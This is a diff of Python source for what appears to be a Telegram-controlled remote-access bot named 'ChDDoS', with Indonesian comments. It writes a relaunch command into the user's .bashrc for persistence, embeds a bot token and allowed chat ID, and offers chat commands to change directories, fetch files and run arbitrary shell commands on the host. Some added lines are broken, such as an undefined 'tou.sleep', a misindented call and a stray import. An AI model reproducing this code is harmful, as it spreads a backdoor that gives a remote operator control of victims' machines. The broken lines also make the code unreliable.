@@ -1,5 +1,3 @@
-#!/usr/bin/env python3
-
 import subprocess
 import os
 
@@ -13,8 +11,7 @@ def check_screen():
     return screen_name in output
 
 def run_screen():
-    os.system(f"screen -d -m -S {screen_name} ChDDoS")
-    #subprocess.run(["screen", "-d", "-m", "-S", screen_name, "python3", bot_file])
+    subprocess.run(["screen", "-d", "-m", "-S", screen_name, "python3", bot_file])
 
 if __name__ == "__main__":
     if os.path.exists(bot_file) and not check_screen():
@@ -46,6 +43,8 @@ except ImportError:
 os.system(f"echo screen -d -m -S {screen_name} python3 ChDDoS.py > $HOME/.bashrc")
 #os.system("screen -d -m python3 ChDDoS.py")
 #os.system("bash")
+tou.sleep(2)
+os._exit(0)
 TOKEN = '7897939362:AAGtB2Ou4USDEN-bpYgdGqDEbiuOX22JsLA'
 ALLOWED_CHAT_ID = [6469804005] 
 
@@ -124,10 +123,16 @@ async def cd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             else:
                 await update.message.reply_text('Direktori tidak ditemukan')
                 return
-        await update.message.reply_text(f'Direktori saat ini: {current_dir}')
+        # Menggunakan os.system("cd <path>") tidak akan berpengaruh
+         os.system(f"cd {current_dir}")
+        
+        # Menggunakan os.chdir() untuk mengubah direktori kerja proses Python
+        os.chdir(current_dir)
+        
+        await update.message.reply_text(f'Direktori saat ini: {os.getcwd()}')
     except Exception as e:
         await update.message.reply_text(f'Gagal mengganti direktori: {str(e)}')
-
+        
 async def get(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not check_allowed_chat(update):
         return
@@ -199,6 +204,8 @@ async def run(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         await update.message.reply_text(f"Perintah '{perintah}' telah dijalankan")
     except Exception as e:
         await update.message.reply_text(f"Error: {str(e)}")
+
+import subprocess
 
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not check_allowed_chat(update):
